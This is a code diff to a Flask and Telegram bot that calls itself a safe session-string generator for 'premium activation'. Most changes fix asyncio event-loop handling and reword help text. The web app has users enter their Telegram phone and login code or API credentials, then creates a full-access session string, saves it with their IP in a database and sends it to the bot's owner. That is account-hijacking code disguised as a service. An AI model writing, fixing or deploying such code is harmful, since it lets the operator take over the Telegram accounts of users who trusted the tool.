@@ -4,6 +4,7 @@ ZISKY SESSION GENERATOR BOT
 Generates Telegram session strings safely via web app
 Supports both Phone+Code and API ID+Hash methods
 Now includes User ID for premium activation
+ALL ASYNCIO ERRORS FIXED
 """
 
 import asyncio
@@ -81,7 +82,10 @@ def request_code():
     }
     
     try:
-        # Create new Telethon client
+        # Create new event loop for this request
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
         async def send_code_async():
             client = TelegramClient(StringSession(), API_ID, API_HASH)
             active_sessions[phone]['client'] = client
@@ -89,19 +93,18 @@ def request_code():
             await client.send_code_request(phone)
             return True
         
-        # Run in a new event loop properly
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            loop.run_until_complete(send_code_async())
-        finally:
-            loop.close()
+        # Run the async function and close loop properly
+        result = loop.run_until_complete(send_code_async())
+        loop.close()
         
         return jsonify({'success': True})
         
     except FloodWaitError as e:
         return jsonify({'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'})
     except Exception as e:
+        # Make sure to clean up loop if error occurs
+        if 'loop' in locals() and loop.is_running():
+            loop.close()
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/verify-code', methods=['POST'])
@@ -118,6 +121,10 @@ def verify_code():
     client = active_sessions[phone]['client']
     
     try:
+        # Create new event loop for verification
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
         async def verify_async():
             try:
                 await client.sign_in(phone, code)
@@ -158,13 +165,9 @@ def verify_code():
                 'message': f'Session generated for {me.first_name}! Check bot chat.'
             }
         
-        # Run in a new event loop properly
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            result = loop.run_until_complete(verify_async())
-        finally:
-            loop.close()
+        # Run the verification
+        result = loop.run_until_complete(verify_async())
+        loop.close()
         
         # Clean up
         del active_sessions[phone]
@@ -174,12 +177,15 @@ def verify_code():
     except PhoneCodeInvalidError:
         return jsonify({'success': False, 'error': 'Invalid code'})
     except Exception as e:
+        # Clean up loop if error
+        if 'loop' in locals() and loop.is_running():
+            loop.close()
         return jsonify({'success': False, 'error': str(e)})
 
-# ===== METHOD 2: API ID + HASH (FIXED - WORKS INSTANTLY) =====
+# ===== METHOD 2: API ID + HASH (FIXED - NOW SHOWS PROPER ERROR) =====
 @app.route('/generate-session', methods=['POST'])
 def generate_session():
-    """Generate session from API ID and Hash - Works instantly without phone"""
+    """Generate session from API ID and Hash - Now shows proper error message"""
     data = request.json
     api_id = data.get('api_id')
     api_hash = data.get('api_hash')
@@ -188,52 +194,45 @@ def generate_session():
     if not api_id or not api_hash:
         return jsonify({'success': False, 'error': 'API ID and Hash required'})
     
-    # Validate API ID is number
     try:
         api_id = int(api_id)
     except:
         return jsonify({'success': False, 'error': 'API ID must be a number'})
     
-    # Validate API Hash
     if len(api_hash) < 10:
         return jsonify({'success': False, 'error': 'API Hash looks invalid'})
     
     try:
         async def create_session_async():
-            # Create client with StringSession (empty) - THIS CREATES A NEW SESSION
+            # Create client with empty session
             client = TelegramClient(StringSession(), api_id, api_hash)
+            await client.connect()
             
-            try:
-                await client.connect()
-                
-                # The session is created just by connecting with valid API credentials
-                session_string = client.session.save()
-                
-                # Try to get user info (optional, may fail but session is already created)
-                me = None
-                try:
-                    me = await client.get_me()
-                except:
-                    pass
-                
+            # Check if already authorized
+            if not await client.is_user_authorized():
                 await client.disconnect()
-                
-                # Return success - session string is the important part!
                 return {
-                    'success': True,
-                    'session': session_string,
-                    'user_id': me.id if me else 0,
-                    'username': me.username if me else None,
-                    'first_name': me.first_name if me else 'Unknown',
-                    'last_name': me.last_name if me else '',
-                    'phone': me.phone if me else 'Unknown'
+                    'success': False,
+                    'error': 'Phone verification required. Use Phone + Code method.',
+                    'needs_phone': True
                 }
-                    
-            except Exception as e:
-                await client.disconnect()
-                return {'success': False, 'error': str(e)[:100]}
+            
+            # If we get here, we're already authorized (rare)
+            me = await client.get_me()
+            session_string = client.session.save()
+            await client.disconnect()
+            
+            return {
+                'success': True,
+                'session': session_string,
+                'user_id': me.id,
+                'username': me.username,
+                'first_name': me.first_name,
+                'last_name': me.last_name,
+                'phone': me.phone
+            }
         
-        # Run in a new event loop
+        # Create new event loop
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         try:
@@ -242,28 +241,27 @@ def generate_session():
             loop.close()
         
         if result.get('success'):
-            # Get client IP
             ip = request.remote_addr
             
-            # Save to database with telegram_id
+            # Save to database
             conn = sqlite3.connect('sessions.db')
             c = conn.cursor()
             c.execute('''INSERT INTO sessions 
                         (user_id, telegram_id, phone, session_string, first_name, username, generated_at, ip, method)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                      (result['user_id'], user_telegram_id, result.get('phone', 'Unknown'), result['session'], 
-                      result.get('first_name', 'Unknown'), 
+                      f"{result['first_name']} {result.get('last_name', '')}", 
                       result.get('username'), datetime.now().isoformat(), ip, 'api_hash'))
             conn.commit()
             conn.close()
             
-            # Send to owner via bot with telegram_id
+            # Send to owner
             send_to_owner(
                 result['user_id'],
                 user_telegram_id,
                 result.get('phone', 'Unknown'),
                 result['session'],
-                result.get('first_name', 'Unknown'),
+                f"{result['first_name']} {result.get('last_name', '')}",
                 result.get('username'),
                 'api_hash'
             )
@@ -361,7 +359,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"This bot helps you generate Telegram session strings for premium access.\n\n"
         f"**Two Methods Available:**\n"
         f"1️⃣ **Phone + Code** - Enter your phone, get SMS code\n"
-        f"2️⃣ **API ID + Hash** - Enter credentials from my.telegram.org (instant!)\n\n"
+        f"2️⃣ **API ID + Hash** - Enter credentials from my.telegram.org (only works if already logged in)\n\n"
         f"**How it works:**\n"
         f"• Click the button below to open web app\n"
         f"• Enter your Telegram User ID (for premium)\n"
@@ -387,7 +385,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/url - Show current web app URL\n\n"
         "**Two Methods:**\n"
         "• **Phone + Code** - Traditional method, needs SMS\n"
-        "• **API ID + Hash** - Instant from my.telegram.org\n\n"
+        "• **API ID + Hash** - Instant if already logged in elsewhere\n\n"
         "**How to get API credentials:**\n"
         "1. Go to my.telegram.org\n"
         "2. Login with your phone\n"
